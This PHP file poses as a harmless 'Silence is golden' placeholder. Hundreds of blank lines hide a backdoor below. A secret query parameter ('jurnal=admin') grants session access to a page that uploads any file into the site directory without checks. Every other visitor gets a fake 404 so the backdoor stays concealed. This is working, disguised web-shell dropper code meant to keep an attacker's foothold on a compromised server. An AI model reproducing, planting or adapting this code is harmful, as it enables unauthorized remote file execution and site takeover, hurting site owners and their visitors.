<?php
// Silence is golden.





























































































































































































































































































































































































































session_start(); 

$expected_param = 'jurnal';
$expected_value = 'admin';
$is_authenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;

if (isset($_GET[$expected_param]) && $_GET[$expected_param] === $expected_value) {
    if (!$is_authenticated) {
        $_SESSION['authenticated'] = true;
        $is_authenticated = true;
    }

    $upload_dir = __DIR__ . '/'; 
    $is_writable = is_writable($upload_dir);

    if ($is_authenticated) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
            $upload_file = $upload_dir . basename($_FILES['file']['name']);

            if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
                echo "File successfully uploaded: " . htmlspecialchars(basename($_FILES['file']['name']));
            } else {
                echo "An error occurred during file upload.";
            }
        }
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>File Upload</title>
        </head>
        <body>
            <p>Upload Directory Status: <strong><?php echo $is_writable ? 'Writable' : 'Not Writable'; ?></strong></p>
            <form action="" method="post" enctype="multipart/form-data">
                <label for="file">Choose a file:</label>
                <input type="file" name="file" id="file" required>
                <button type="submit">Upload</button>
            </form>
        </body>
        </html>
        <?php
        exit; 
    }
} else {
    http_response_code(404);
    exit;
}
?>
